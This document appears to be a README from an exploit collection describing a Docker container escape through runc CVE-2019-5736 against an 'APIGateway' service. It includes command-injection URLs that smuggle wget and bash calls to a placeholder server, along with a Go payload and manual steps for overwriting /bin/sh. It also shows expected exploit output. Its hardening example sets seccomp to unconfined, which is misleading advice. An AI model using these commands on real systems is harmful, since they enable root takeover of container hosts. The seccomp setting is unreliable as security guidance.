# APIGateway - Docker Escape Exploits

## Overview
Container escape exploit targeting the runc CVE-2019-5736 vulnerability. Requires RCE access first.

## Target Application
- **Project**: APIGateway  
- **Port**: 5004
- **Prerequisites**: RCE access (see `../rce/` exploits)

## Exploits

### runc_cve_2019_5736.sh
Exploits runc CVE-2019-5736 to escape Docker container.

**Vulnerability Details:**
- **CVE**: CVE-2019-5736
- **Affected**: runc < 1.0-rc6
- **Severity**: Critical (CVSS 8.6)
- **Description**: Attacker can overwrite runc binary on host

**Usage:**
```bash
# 1. First gain RCE on APIGateway
python3 ../rce/command_injection.py

# 2. Upload and execute the exploit
# Option A: Via command injection
curl "http://localhost:5004/health?host=127.0.0.1;wget%20http://YOUR_SERVER/runc_cve_2019_5736.sh"
curl "http://localhost:5004/health?host=127.0.0.1;bash%20runc_cve_2019_5736.sh"

# Option B: Copy to container and execute
docker cp runc_cve_2019_5736.sh apigateway:/tmp/
docker exec apigateway bash /tmp/runc_cve_2019_5736.sh
```

**What it does:**
1. Checks runc version for vulnerability
2. Overwrites `/bin/sh` in the container
3. Triggers host runc execution
4. Overwrites host runc binary with malicious payload
5. Gains root access on host system

**Expected Output (if vulnerable):**
```
[+] Checking runc version...
[+] runc version 1.0.0-rc5 (VULNERABLE)
[+] Preparing payload...
[+] Waiting for runc execution...
[+] Host runc overwritten!
[+] Execute 'docker exec' to trigger
[+] You will get root on host
```

**Expected Output (if patched):**
```
[-] runc version 1.0.0-rc10 (PATCHED)
[-] Not vulnerable to CVE-2019-5736
```

## Checking Vulnerability

### Check runc version on host:
```bash
runc --version
```

Vulnerable versions:
- runc < 1.0-rc6
- Docker < 18.09.2

### Check from container:
```bash
docker exec apigateway runc --version
```

## Defense Recommendations

### 1. Update runc
```bash
# Ubuntu/Debian
sudo apt update
sudo apt install runc

# Check version (must be >= 1.0-rc6)
runc --version
```

### 2. Update Docker
```bash
# Update to >= 18.09.2
sudo apt install docker-ce docker-ce-cli containerd.io
```

### 3. Security Hardening
```yaml
# docker-compose.yml
security_opt:
  - "no-new-privileges:true"
  - "apparmor=docker-default"
  - "seccomp=unconfined"  # Use custom seccomp profile
read_only: true
user: "1000:1000"  # Non-root
```

### 4. Runtime Protection
```bash
# Use gVisor for stronger isolation
docker run --runtime=runsc ...

# Use Kata Containers (VM-based)
docker run --runtime=kata-runtime ...
```

## Manual Exploit Steps (Educational)

### 1. Create malicious payload:
```go
// main.go - Overwrite runc binary
package main

import (
    "os"
    "os/exec"
)

func main() {
    // Malicious code to execute on host
    cmd := exec.Command("/bin/bash", "-c", "echo PWNED > /tmp/pwned")
    cmd.Run()
}
```

### 2. Compile and replace /bin/sh:
```bash
go build -o /bin/sh main.go
chmod +x /bin/sh
```

### 3. Trigger from host:
```bash
docker exec apigateway /bin/sh
# This executes your malicious /bin/sh as root on host
```

## Impact
Successful exploitation allows:
- Full root access on host system
- Access to all containers
- Host filesystem manipulation
- Persistent backdoor installation
- Complete infrastructure compromise

## Notes
**CRITICAL WARNING**: 
- This is a SEVERE vulnerability
- Only test on isolated systems
- Can permanently damage systems
- Requires careful cleanup

**Legal**: Only use on systems you own or have explicit written authorization to test.

## References
- CVE-2019-5736: https://nvd.nist.gov/vuln/detail/CVE-2019-5736
- Original Advisory: https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html
- Proof of Concept: https://github.com/Frichetten/CVE-2019-5736-PoC

## Related Exploits
- First gain RCE: `../rce/command_injection.py` or `../rce/bash_env_exec.rb`
